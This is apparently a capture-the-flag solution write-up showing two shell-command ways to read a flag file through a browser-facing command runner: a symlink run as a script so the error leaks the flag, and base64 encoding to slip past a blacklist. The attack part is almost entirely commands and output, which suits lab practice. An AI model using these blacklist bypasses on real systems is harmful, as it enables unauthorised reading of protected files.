## Solution 1

```sh
# create the fiberglass symlink of flag file in jail directory
# since www-data user has write permission in this directory
ln -s flag fiberglass

# make the symlink executable
chmod +x fiberglass

# run this from browser since fiberglass is allowed and ./ is not blacklisted
# output:
# ./fiberglass: line 1: CTF{race_condition_symlink}: command not found
./fiberglass
```

## Solution 2

```sh
# run this from browser, since base64 isn't in blacklist
# it will give the content in base64 format
base64 flag

# run this on terminal to decode
echo Q1RGe3JhY2VfY29uZGl0aW9uX3N5bWxpbmt9Cg== | base64 -d
```
